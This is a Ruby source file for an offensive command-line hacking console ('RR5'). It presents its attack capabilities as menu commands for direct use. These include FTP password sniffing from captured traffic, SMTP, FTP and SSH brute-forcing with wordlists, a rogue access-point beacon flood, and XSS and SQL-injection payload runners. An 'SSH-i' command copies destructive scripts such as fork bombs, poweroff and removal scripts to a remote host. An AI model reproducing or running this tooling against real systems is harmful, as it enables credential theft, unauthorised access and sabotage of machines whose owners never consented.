require 'colorize'
require 'packetgen'
require 'socket'
require 'open-uri'
require 'readline'
require 'rubygems'
require 'timeout'
require 'net/http'
require 'whois'
require 'whois-parser'
require 'socket'
require 'net/ssh'
require 'colorize'
require 'httparty'
require 'timeout'
require 'uri'
require 'openssl'
require 'net/dns'
require 'packetfu'
# FTP module 
require './mod-ftp'
# TCP module for packet analysis
require './mod-net.rb' 


# use this in a instance of line seperation \n\n \y\y\ etc
def sep(seperation)
    puts "#{seperation}"
end

# open a file, save lines of code 
def open_file(color, filename)
    file = File.open(filename)
    fd = file.readlines.map(&:chomp)
    puts color, fd
    file.close
end

# to make sure that it is a simple call command for running etc files
def dir_command(filepath, command) 
    system("cd #{filepath} ; #{command}")
end

# detecting the os
def os
    if RUBY_PLATFORM =~ /win32/
        puts "                                          Detected Os ->  Windows"
      elsif RUBY_PLATFORM =~ /linux/
        puts "                                          Detected Os ->  Linux"
      elsif RUBY_PLATFORM =~ /darwin/
        puts "                                          Detected Os -> Mac OS X"
      elsif RUBY_PLATFORM =~ /freebsd/
        puts "                                          Detected Os -> FreeBSD"
      else
        puts "                                          Detected Os -> is unknown"
      end
    end


# web port scaner ruby 
def webscan
    puts 'Ex www.google.com'
    puts '-------------------'
    print"Target World Wide Web link  ~~> ".colorize(:red)
    www = gets.chomp 
    ipa = IPSocket::getaddress("#{www}")
    puts '______________________________________________'
    puts '[+] Scanning Host ~~> '.colorize(:yellow) + ipa
    puts '[+] Scanning 65,000 Ports'.colorize(:yellow)
    puts '----------------------------------------------'.colorize(:red)
    ports = 1..65389
    ports.each do |scan|
        begin
            Timeout::timeout(0.1){TCPSocket.new(ipa, scan)}
            rescue
                #puts "[PORT] #{scan} IS [CLOSED]"
            else
                dt = DateTime.now
                puts dt.next_month.strftime(" \033[36m[\033[35m%H:%M\033[36m] ") + "\033[35m[\033[36mRED-RABBIT-INF\033[35m] " + "[PORT#{scan}] CAME BACK OPEN"
            end
            #
            rescue Interrupt
                puts '[!] Exiting Scan'
                print "Would you like to go back to the menue Y/n >>> "
                get = gets.chomp
                if get == 'Y'
                    console_main
                end
                if get == 'n'
                    puts '[+] Exiting...'
                    exit!
                end
        end
    end

def hostscan
    print"Target Address ~~> ".colorize(:red)
    ip = gets.chomp 
    ports = 1..65000
    ports.each do |scan|
        begin
            Timeout::timeout(0.1){TCPSocket.new(ip, scan)}
            rescue
                #puts "[PORT] #{scan} IS [CLOSED]"
            else
                dt = DateTime.now
                puts dt.next_month.strftime(" \033[36m[\033[35m%H:%M\033[36m] ") + "\033[35m[\033[36mRED-RABBIT-INF\033[35m] " + "[PORT#{scan}] CAME BACK OPEN"
            end
            #puts '[Finished Scan]'
        end
    end


########################################################################################################################
#
# Documentation: Module 5 chapter 2 i talk about fixing the error phy dev `too many open files` despite being in root 
# using a shell called RB-Shell, this is the start of RB-Shell, RB-Shell is an extension mock of the standard command 
# line interface/kernal by defualt in linux, this is a small terminal to help fix such script errors that revolve 
# around what would be used as a system command 
#
# something like phydev in this case 
#
# From: ArkAngeL43
#
#
# shell libs: readlines
# mind map: https://www.rubyguides.com/2016/07/writing-a-shell-in-ruby/
# 
#
#
# shell starts here and ends on line < input line here > 
#
#
#
#module Shell_commands
#    def cmexe(command)
#        system(command)
#    end
#end
#
#class Shell_Exec
 #   include Shell_commands
#    def execute()
#        cmexe(@command)
#    end
#end
module Shell
    class Command
        attr_accessor :cmdline
        attr_reader   :output
        # initalizer
        def initialize(cmdline)
            @cmdline = cmdline.to_s
        end
        # execution 
        def execute
            @output = `#{@cmdline}`
            return @output
        end
    end
end



def shell_ascii()
    puts "
    ********************************************************
    * Interactive os ruby shell, for fixing script errors  *
    * if you are here most likely you found it or ran into *
    * an error.                                            *
    *                                                      *
    *                                                      *
    *Commands: fix-UID-perr, break                         *
    |------------------------------------------------------|"
    end 


def main_shell()
    print "> "
    os1 = gets.chomp
    if os1 == "clear" || os1 == "cls"
        print"\x1b[H\x1b[2J\x1b[3J"
        shell_ascii
        puts "\n"
        main_shell
    end
    if os1 == "fix-UID-perr"
        puts "[ + ] Getting global usage"
        puts "\n"
        puts "----- global usage -----"
        system("awk '{print $1}' /proc/sys/fs/file-nr")
        puts "\n"
        print "\033[35m\n\nPress enter when you want to continue => "
        con1 = gets.chomp
        if con1 == ""
            print "\nplease input what you want the new limit to be NOTE CAN NOT BE HIGHER THAN HARD LIMIT 4090 IS BEST"
            puts "\n => " 
            con2 = gets.chomp
            system("ulimit -n #{con2}")
        end
    end
    if os1 == "break" || os1 == "exit"
        puts "[ :WARN ] Exiting"
        exit!
    end
    if os1 == "c-freq-interface" || os1 == "C-FREQ-INTERFACE"
        print "Interface > "
        freqi = gets.chomp
        puts "\nDefualt is 2437"
        print "Frequency > "
        freq = gets.chomp
        #sudo iw dev mon0 set freq 2437
        parsed_command = "sudo iw dev #{freqi} set freq #{freq}"
        system("#{parsed_command}")
    end
    if os1 == "SET+MODE=Monitor" 
        print "Interface > "
        ifa = gets.chomp
        system("sudo ip link set #{ifa} down")
        puts " Interface down"
        system("sudo iw #{ifa} set monitor none")
        puts " Mon0 None"
        system("sudo ip link set #{ifa} up")
        puts " Monitor mode set!"
        system("sudo iw dev")
    end
end

def shell_command_exec()
    case(Process.uid)
    when 0
        shell_ascii
        print "ROOT@RR5> "
        input = gets.chomp
        if input == "clear" || input == "cls"
            print"\x1b[H\x1b[2J\x1b[3J"
            shell_ascii
        end
        if input == "break"
            exit!
            print"\x1b[H\x1b[2J\x1b[3J"
            console_main
        end
        if input == "fix-UID-perr"
            puts "[ + ] Getting global usage"
            puts "\n"
            puts "----- global usage -----"
            system("awk '{print $1}' /proc/sys/fs/file-nr")
            puts "\n"
            print "\033[35m\n\nPress enter when you want to continue => "
            con1 = gets.chomp
            if con1 == ""
                print "\nplease input what you want the new limit to be NOTE CAN NOT BE HIGHER THAN HARD LIMIT 4090 IS BEST"
                puts "\n => " 
                con2 = gets.chomp
                system("ulimit -n #{con2}")
            end
        end
    else
        $stderr.puts("[ - ] ERROR: FATAL: YOU MUST BE ROOT TO USE THIS SHELL")
        exit!
    end
end




############ BEGGINING OF MAKING MAIN COMMAND FUNCTIONS #################

def tcp_dumb(iface)
    cap = PacketFu::Capture.new(:iface=> "#{iface}", :promisc => true, :start => true)
    cap.show_live
end


def ftpsniff(ifl)
    PacketGen.capture(iface: "#{ifl}", filter: 'port ftp or ftp-data', max: 1000) do |pkt|
    puts "[ + ] Capturing....Awaiting response"
        if pkt.tcp.body.include?("USER") || pkt.tcp.body.include?("PASS")
        puts pkt.ip.src + " -> " + pkt.ip.dst 
        puts pkt.tcp.body
        end
    end
end


def captured(file)
    pkts = PacketGen.read(file)
    pkts.each do |pkt| 
    if pkt.tcp.body.include?("USER") || pkt.tcp.body.include?("PASS")
        puts pkt.ip.src + "<CONN>" + pkt.ip.dst 
        puts pkt.tcp.body
    end
    end
end


    


def rouge()
    iface     = 'wlan0mon'
    broadcast = "ff:ff:ff:ff:ff:ff"
    bssid     = "aa:aa:aa:aa:aa:aa"
    print("Fake SSID Name >>> ")
    ssid      = gets.chomp
    while true
        pkt = PacketGen.gen('RadioTap').add('Dot11::Management', mac1: broadcast, mac2: bssid, mac3: bssid).add('Dot11::Beacon', interval: 0x600, cap: 0x401)
        pkt.dot11_beacon.elements << {type: 'SSID', value: ssid}
        pp pkt
        100000.times do 
        pkt.to_w(iface)
        puts "Beacons being broadcasted ~> #{ssid} " 
        end
    end
end

def dg(domain)
    whois = Whois::Client.new
    whois.lookup("#{domain}")
    record = Whois.whois("#{domain}")
    parser = record.parser
    register = parser.registered?
    created = parser.created_on 
    main = parser.technical_contacts.first
    resolver = Net::DNS::Resolver.start("#{domain}")
    resol2 = Net::DNS::Resolver.start("#{domain}").answer
    resol3 = Net::DNS::Resolver.start("#{domain}", Net::DNS::MX).answer
    sep("\n\n")
    puts resolver
    sep("\n\n")
    puts resol2
    sep("\n\n")
    puts resol3
    parser.nameservers.each do |nameserver|
        puts "\033[34m[+] -> "+ "#{nameserver}"
    end
end

def basic_grabber(url)
    puts "\n\n\033[32m"
    uri = URI.parse("#{url}")
    http = Net::HTTP.new(uri.host, uri.port)
    userag     = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.54 Safari/537.36"
    uri  = URI.parse("#{url}")
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl        = true if uri.scheme == 'https'
    http.verify_mode    = OpenSSL::SSL::VERIFY_NONE
    date = Time.new 
    req  = Net::HTTP::Get.new(uri.request_uri)
    pp req.to_hash
    req["User-Agent"] = "#{userag}"
    res   = http.request(req)
    resur = Net::HTTP.get_response(URI.parse(url.to_s))
    res.code
    res.message 
    res.code_type
    res.content_type
    pp res.to_hash
end

def server_names(domain, url)
    whois = Whois::Client.new
    whois.lookup("#{domain}")
    record = Whois.whois("#{domain}")
    parser = record.parser
    register = parser.registered?
    created = parser.created_on 
    main = parser.technical_contacts.first
    resolver = Net::DNS::Resolver.start("#{domain}")
    resol2 = Net::DNS::Resolver.start("#{domain}").answer
    resol3 = Net::DNS::Resolver.start("#{domain}", Net::DNS::MX).answer
    sep("\n\n")
    puts resolver
    sep("\n\n")
    puts resol2
    sep("\n\n")
    puts resol3
    parser.nameservers.each do |nameserver|
        puts "\033[34m[+] -> "+ "#{nameserver}"
    end
    uri = URI.parse("#{url}")
    n = `host #{domain}`.match(/(\d{1,3}\.){3}\d{1,3}/).to_s
    http = Net::HTTP.new(uri.host, uri.port)
    userag     = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.54 Safari/537.36"
    uri  = URI.parse("#{url}")
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl        = true if uri.scheme == 'https'
    http.verify_mode    = OpenSSL::SSL::VERIFY_NONE
    date = Time.new 
    req  = Net::HTTP::Get.new(uri.request_uri)
    pp req.to_hash
    req["User-Agent"] = "#{userag}"
    res   = http.request(req)
    resur = Net::HTTP.get_response(URI.parse(url.to_s))
    res.code
    res.message 
    res.code_type
    res.content_type
    pp res.to_hash
    puts '-------------------------'
    puts '[*] Response ~> '  + resur.code 
    sleep 0.1
    puts '[*] Checking More Connections..'
    puts '--------------------------'
    a = HTTParty.get(url).headers
    ip = IPAddr.new(n)
    map = ip.ipv4_compat.to_string
    puts '[*] Query          => '  , uri.query  
    puts '[*] Scheme         => '  , uri.scheme
    puts '[*] Port  Main     => '  , uri.port
    puts '[*] HOSTNAME       => '  , uri.host
    puts '[*] Path           => '  , uri.path
    puts '[*] Request URI    => '  , uri.request_uri 
    puts '[*] Server         => '  +  a["server"] 
    puts '[*] Date           => '  +  a["date"] 
    puts '[*] Content        => '  +  a["content-type"] 
    puts '[*] Response Code  => '  + resur.code
    puts '[*] Last-mod       => '  
    puts a["last-modified"]
    puts '[*] trans-enc      => '  
    puts a["transfer-encoding"]
    puts '[*] Connection     => '  + a["connection"]
    puts '[*] Access-control => '  
    puts a["access-control-allow-origin"]
    puts '[*] Cache-control  => '  
    puts resur.response["Cache-Control"]
    puts '-----------------------SERVER INF--------------------'  
    puts '[*] Calculated IPV6 | '  + map                 
    puts '[*] Server IP       | '  + n 
    puts '[*] X-Frame-OP      | '  
    puts resur.response["x-frame-options"]
    puts '[*] X-XSS-Protect   | '  
    puts  resur.response["x-xss-protection"]
    puts '[*] X-Content-type  | '  
    puts resur.response["x-content-type-options"]
    puts '[*] Max-Age         |'  
    puts resur.response["max-age"]
    puts '[*] X-Request-ID    |' 
    puts resur.response["x-request-id"]
    puts '[*] X-Runtime       |' 
    puts resur.response["x-runtime"]
    puts '[*] Access Control  |' 
    puts resur.response["access_control_max_age"]
    puts '[*] Access Allow    |' 
    puts resur.response["access_control_allow_methods"]
    puts '[*] Content Length  |' 
    puts resur.response["content-length"]
    puts '[*] Connection      |' 
    puts resur.response["connection"]
    puts '[*] Content_Dispo   |' 
    puts resur.response["content_disposition"]
    puts '[*] Expires         |' 
    puts resur.response["expires"]
    puts '[*] set-cookie      |' 
    puts resur.response["set-cookie"]
    puts '[*] user-Agent      |' 
    puts resur.response["user-agent"]
    puts '[*] bfcache-opt-in  |' 
    puts resur.response["bfcache-opt-in"]
    puts '[*] Content encode  | ' 
    puts resur.response["content-encoding"]
    puts '[*] content-sec     | ' 
    puts resur.response["content-security-policy"]
    puts '[*] Session Cookie  |' 
    puts resur.response["set-cookie"]
    puts '[*] strict-trans    |' 
    puts resur.response["strict-transport-security"]
    puts '[*] method          |' 
    puts resur.response["method"]
end

def hd(fd)
    file_name = fd
    file = File.open(file_name , 'rb')
    file2hex = file.read.each_byte.map { |b| '\x%02x' % b }.join    # b.to_s(16).rjust(2, '0')
    sep("\n\n\n")
    puts "---------------------------------------------------- HEXIDECIMAL DUMP ---------------------------------------"
    puts "\033[32m", file2hex
    puts "---------------------------------------------------- BINARY DUMP ---------------------------------------"
    dir_command("modules/file", "go run hex.go -f #{fd} -b 256")
end

# sos start or stop interface
def active_seactiv_interface(sos, interface)
    system("sudo airmon-ng #{sos} #{interface}") 
    puts "[ + ] Interface #{sos}"
end

def move(filepath, destination)
    require 'fileutils'
    my_dir = Dir["#{filepath}/*.txt"]
    my_dir.each do |filename|
    name = File.basename('filename', '.doc')[0,4]
    dest_folder = "#{destination}"
    FileUtils.cp(filename, dest_folder)
    end
end


# ftp sniffing V2 
def n(backslash)
    puts backslash
end

def main_tcp(tcp_port)
    rev       = "\033[0;39m"
    reb       = "\033[49m"
    blk       = "\033[0;30m"
	red       = "\033[0;31m"
	grn       = "\033[0;32m"
	yel       = "\033[0;33m"
	blu       = "\033[0;34m"
	mag       = "\033[0;35m"
	cyn       = "\033[0;36m"
	wht       = "\033[0;37m"
    blkb      = "\033[40m"
	redb      = "\033[41m"
	grnb      = "\033[42m"
	yelb      = "\033[43m"
	blub      = "\033[44m"
	magb      = "\033[45m"
	cynb      = "\033[46m"
	whtb      = "\033[47m"
    stats = TCPdump.new
    # packetfu connection and configuration
    iface = PacketFu::Utils.default_int
    my_ip = PacketFu::Utils.ifconfig(iface)[:ip_saddr]
    tcp_start_config = PacketFu::Capture.new(:iface => iface)
    tcp_start_config.bpf(:iface=> iface, :promisc => true, :filter => "ip and tcp port #{tcp_port}")
    #
    # start the dump
    tcp_start_config.start
    # for each packet format the data
    pack = 0
    tcp_start_config.stream.each do | packet |
        n("\n\n")
        pack += 1
        info = PacketFu::Packet.parse(packet)
        stats.process_connection(:source => info.ip_saddr, :destination => info.ip_daddr)
        puts stats.stats
        t = Time.now
        puts(wht, "[" + redb + t.strftime("%I:%M %p") + wht + "]" + wht + "[" + blub + " INFO " + wht + reb + "]"  + grn + " Packets captured => " + pack.to_s)
        puts(wht, "[" + redb + t.strftime("%I:%M %p") + wht + "]" + wht + "[" + blub + " INFO " + wht + reb + "]"  + blu, :source => info.ip_saddr.to_s )
    end
end


def console_commands(commands)
    rev       = "\033[0;39m"
    reb       = "\033[49m"
    blk       = "\033[0;30m"
	red       = "\033[0;31m"
	grn       = "\033[0;32m"
	yel       = "\033[0;33m"
	blu       = "\033[0;34m"
	mag       = "\033[0;35m"
	cyn       = "\033[0;36m"
	wht       = "\033[0;37m"
    blkb      = "\033[40m"
	redb      = "\033[41m"
	grnb      = "\033[42m"
	yelb      = "\033[43m"
	blub      = "\033[44m"
	magb      = "\033[45m"
	cynb      = "\033[46m"
	whtb      = "\033[47m"
    if commands == "dm-b" || commands == "DM-B"
        puts "If you are having trouble understanding please
              refer to the documentation, module 7 chapter 1 
              for further instructions"
        puts "_____________________________________________"
        print "Please enter the path of the config file > "
        sep("\n\n")
        print "Filepath > "
        fp = gets.chomp
        dir_command("modules/dns-blockers", "go run block-dns-loop.go -config #{fp}")
              end
    if commands == "W-SSID"  || commands == "w-ssid"
        dir_command("modules/wifi", "python3 sniffer-ssid.py")
        console_main
    end
    if commands == "G-BSSID" || commands == "g-bssid"
        dir_command("modules/wifi", "go run bssid.go")
        console_main
    end
    if commands == "SMTP-b" || commands == "SMTP-B"
        puts "
        List of services 
        ___________
        [ gmail   ] = smtp.gmail.com
        [ hotmail ] = smtp.live.com
        [ yahoo   ] = smtp.mail.yahoo.com 
        |)))))))))|
        "
        print "\nService  > "
        service = gets.chomp.to_s
        print "\nEmail    > "
        email = gets.chomp
        print "\nWordlist > "
        wordlist = gets.chomp.to_s
        dir_command("modules/brute-forcing", "go run smtp.go -email #{email} -list #{wordlist} -service #{service}")
        console_main
    end
    if commands == "HTML-r" || commands == "HTML-R"
        t = Time.now
        defmodule = "modules/url-parser"
        print "URL > "
        uo = gets.chomp.to_s
        dir_command("modules/url-parser", "go run html.go -targ #{uo}")
        puts(wht, "[" + redb + t.strftime("%I:%M %p") + wht + "]" + wht + "[" + blub + " INFO " + wht + reb + "]"  + grn + " File location => " + defmodule)
        console_main
    end
    if commands == "URL-r" || commands == "URL-R"
        puts "\n\n"
        puts "\033[32mExample > https://github.com/ArkAngeL43/Go-Diver/blob/main/crawl.go#L4"
        print "\n\033[34mComplex URL > "
        complex_url = gets.chomp.to_s
        dir_command("modules/url-parser", "go run url.go -url #{complex_url}")
        console_main
    end
    if commands == "F-dns" || commands == "F-DNS"
        print "\nDNS > \033[35m"
        dns = gets.chomp
        dg("#{dns}")
        console_main
    end
    if commands == "dom-g" || commands == "DOM-G"
        print "\nURL > "
        dom = gets.chomp
        basic_grabber("#{dom}")
        console_main
    end
    if commands == "d-g" || commands == "D-G"
        print "\nHost to scan > "
        h = gets.chomp
        dir_command("modules/port-scanning", "go run scanner.go -pscanh -host #{h}")
        console_main
    end
    if commands == "port-g-l" || commands == "PORT-G-L"
        print "\nPath to list > "
        path = gets.chomp
        dir_command("modules/port-scanning", "go run scanner.go -portl -list #{path}")
        console_main
    end
    if commands == "port-r" || commands == "PORT-R"
        webscan
        console_main
    end
    if commands == "port-r-h" || commands == "PORT-R-H"
        hostscan
        console_main
    end
    if commands == "port-lg" || commands == "PORT-LG"
        dir_command("modules/wifi", "go run arp.go -portl -list lace_ip.txt")
        console_main
    end
    if commands == "ARP" || commands == "arp"
        dir_command("modules/wifi", "go run arp.go -arp")
    end
    if commands == "SSH-i"
        print "\nSSH User > "
        host = gets.chomp
        print "SSH IP > "
        hip = gets.chomp
        system("sudo service ssh start ; scp modules/sshv/damage-net.sh #{USER}@#{HOST}")
        system("scp modules/sshv/poweroff.sh #{USER}@#{HOST}")
        system("scp modules/sshv/restart.sh #{USER}@#{HOST}")
        system("scp modules/sshv/remove.sh #{USER}@#{HOST}")
        system("scp modules/sshv/win-1.bat #{USER}@#{HOST}")
        system("scp modules/sshv/win-2.bat #{USER}@#{HOST}")
        system("scp modules/sshv/fork.sh #{USER}@#{HOST}")
        system("scp modules/sshv/fork.bat #{USER}@#{HOST}")
        puts "[ + ] DATA: QUESTION: FILE SENT TO HOST?"
        console_main
    end
    if commands == "FTP-b"
        print "\nFTP User > "
        user = gets.chomp.to_s
        print "\nFTP Port > "
        po = gets.chomp.to_s
        print "\nFTP IPA  > "
        ipa = gets.chomp.to_s
        print "\nWordlist > "
        wordlist = gets.chomp.to_s
        puts "\n
            \033[32mINFO: DATA: FTP User => #{user}
            INFO: DATA: FTP Port => #{po}
            INFO: DATA: FTP IPA  => #{ipa}
            INFO: DATA: Wordlist => #{wordlist}
        "
        File.open("#{wordlist}").each do |line|
            ftp = Net::FTP.new
            ftp.connect(ipa, po)
            puts "\t\033[37m[\033[34m INFO \033[37m] Trying password #{line} With user #{user}"
            ftp.login(user, line)
        rescue Errno::ECONNREFUSED
            puts "\033[31mERROR: FATAL: WARN: TO EXIT PLEASE PRESS CTRL+C"
            puts "\033[31mERROR: CONNECTION REFUSED ATTEMPTED ON -> #{ipa} - PORT -> #{po} WITH USER -> #{user} ON PASSWORD #{line}" 
        end
    end
    if commands == "start-i"
        print " Interface > "
        inter = gets.chomp
        active_seactiv_interface("start", "#{inter}")
        console_main()
    end
    if commands == "stop-i"
        print "Interface > "
        inter = gets.chomp
        active_seactiv_interface("stop", "#{inter}")
        console_main()
    end
    if commands == "si-phy"
        system("iw phy phy1 interface add mon0 type monitor && ifconfig mon0 up")
        console_main()
    end
    if commands == "s-phys"
        print "Interface > "
        im = gets.chomp
        system("ifconfig down #{im}")
        console_main()
    end
    if commands == "SSH-B-R"
        print "\nHost user   > "
        user = gets.chomp
        print "\nFilepath to wordlist > "
        wordlist = gets.chomp
        print "\nPort        > "
        port = gets.chomp
        print "\nIPA         > "
        ipa = gets.chomp
        print"\x1b[H\x1b[2J\x1b[3J"
        open_file("\033[35m", "txt/banner.txt")
        dir_command("modules/brute-forcing", "ruby ssh2.rb -host #{ipa} -user #{user} -port #{port} -filename #{wordlist}")
    end
    if commands == "SSH-B-G"
        print "\nHost user  > "
        us = gets.chomp
        sep("\n")
        puts "** WARN: DO NOT PUT TXT AT END OF FILEPATH PLEASE USE
                 EXAMPLE: /usr/share/wordlists  
                 FILE COPY METHOD COPYS ALL TXT FILES IN DIR AND USES THEM
        "
        print "\nFilepath to wordlist   > "
        word = gets.chomp
        print "\nIPA        > "
        ip = gets.chomp
        print "\nPort       > "
        po = gets.chomp
        print "\n"
        puts " EX: dnsmap.txt"
        print "Wordlist name with .txt to use > "
        mwo = gets.chomp
        print"\x1b[H\x1b[2J\x1b[3J"
        open_file("\033[31m", "txt/banner.txt")
        move("#{word}", "modules/brute-forcing")
        dir_command("modules/brute-forcing", "go run ssh.go -user #{us} -file #{mwo} -ip #{ip} -port #{po}")
        console_main()
    end
    if commands == "SSH-p"
        print"\x1b[H\x1b[2J\x1b[3J"
        open_file("\033[35m", "txt/banner.txt")
        consol()
    end
    if commands == "tcp-d"
        print "Port to listen on > "
        tpo = gets.chomp
        main_tcp("#{tpo}")
    end
    if commands == "ftp-C"
        print "\033[34m\nInterface > "
        iface = gets.chomp
        ftpsniff("#{iface}")
        console_main()
    end
    if commands == "ftp-read"
        print "PCAPNG File > "
        fil = gets.chomp
        captured("#{fil}")
        console_main()
    end
    if commands == "fake-ap"
        rouge()
        console_main()
    end
    if commands == "commands"
        open_file("", "txt/commands.txt")
        sep("\n\n")
        console_main()
        
    end
    if commands == "help"
        open_file("", "txt/commands.txt")
        sep("\n\n")
        console_main()
    end
    if commands == "command"
        open_file("", "txt/commands.txt")
        sep("\n\n")
        console_main()
    end
    if commands == "HELP"
        open_file("", "txt/commands.txt")
        sep("\n\n")
        console_main()
    end
    if commands == "COMMANDS"
        open_file("", "txt/commands.txt")
        sep("\n\n")
        console_main()
    end
    if commands == "-h"
        open_file("", "txt/commands.txt")
        sep("\n\n")
        console_main()
    end
    if commands == "art"
        open_file("", "txt/banner.txt")
        sep("\n\n")
        console_main()
    end
    if commands == "clear" or commands == "cls"
        print"\x1b[H\x1b[2J\x1b[3J"
        open_file("\033[31m", "txt/banner.txt")
        console_main()
    end
    if commands == "ajax-wo"
        #go run nuke-ajax.go -target https://www.google.com -domain www.google.com -base http://www.google.com
        print "HTTPS-URL > "
        httpsurl = gets.chomp
        print "DOMAIN > "
        domain = gets.chomp
        print "BASE-HTTP > "
        base = gets.chomp 
        dir_command("modules/ajax-crawlers", "go run ajax-wo.go -target #{httpsurl} -domain #{domain} -base #{base}")
        console_main()
    end
    if commands == "ajax-NK"
        print "HTTPS-URL > "
        httpsurl = gets.chomp
        print "DOMAIN > "
        domain = gets.chomp
        print "BASE-HTTP > "
        base = gets.chomp 
        dir_command("modules/ajax-crawlers", "go run nuke-ajax.go -target #{httpsurl} -domain #{domain} -base #{base}")
        console_main()
    end
    if commands == "whois"
        print "Domain name > "
        domaina = gets.chomp
        print "URL > "
        url = gets.chomp
        server_names("#{domaina}", "#{url}")
        console_main()
    end  
    if commands == "hd"
        print "File path > "
        fp = gets.chomp
        hd("#{fp}")
        console_main()
    end
    if commands == "xss-t"
        print "URL > "
        ul = gets.chomp
        print "XSS list > "
        fl = gets.chomp
        dir_command("modules/injection", "python3 xss.py #{ul} #{fl} ")
        console_main()
    end
    if commands == "sql-t"
        print "URl > "
        ul = gets.chomp
        dir_command("modules/injection", "go run sql.go -t #{ul} -l payloads/SQLI.txt")
        console_main()
    end
    if commands == "RR5-RBShell"
        main_shell
    end


end

def console_main()
    sep("\n")
    print "RR5> "
    a = gets.chomp
    console_commands("#{a}")
end

# checker for modules 
#require './mod-ftp.rb' # module for brute foricng FTP
#rescue LoadError
#  puts "\t\t\t\t\t\033[31m[ - ] \033[35mFATAL: -> FTP module failed to load"
#end
#else
#  puts "\033[32m\t\t\t\t\t[ + ] \033[31mFTP module loaded"
#require './mod-net.rb' # module for network sniffing
#rescue LoadError
#  puts "\t\t\t\t\t\033[31m[ - ] \033[35mFATAL: -> FTP module failed to load"
#else
#  puts "\033[32m\t\t\t\t\t[ + ] \033[31mNET module loaded"

def main()
    print"\x1b[H\x1b[2J\x1b[3J"
    open_file("\033[31m", "txt/banner.txt")
    console_main()
end

main()
